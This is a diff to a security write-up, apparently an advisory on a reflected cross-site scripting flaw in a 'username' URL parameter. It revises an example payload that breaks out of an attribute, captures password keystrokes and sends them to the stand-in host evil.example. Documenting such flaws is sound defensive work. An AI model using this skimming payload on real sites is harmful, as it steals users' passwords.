@@ -29,10 +29,10 @@ If an attacker can get a victim to open a crafted URL, the injected `username` v
 
 ```
 "><script>
-  document.querySelector('[name=password]')
-    .addEventListener('input', e =>
-      fetch('https://evil.example/log?p=' + encodeURIComponent(e.target.value))
-    );
+  document.addEventListener('input', e => {
+    if (e.target.name === 'password')
+      fetch('https://evil.example/log?p=' + encodeURIComponent(e.target.value));
+  });
 </script>
 ```
 
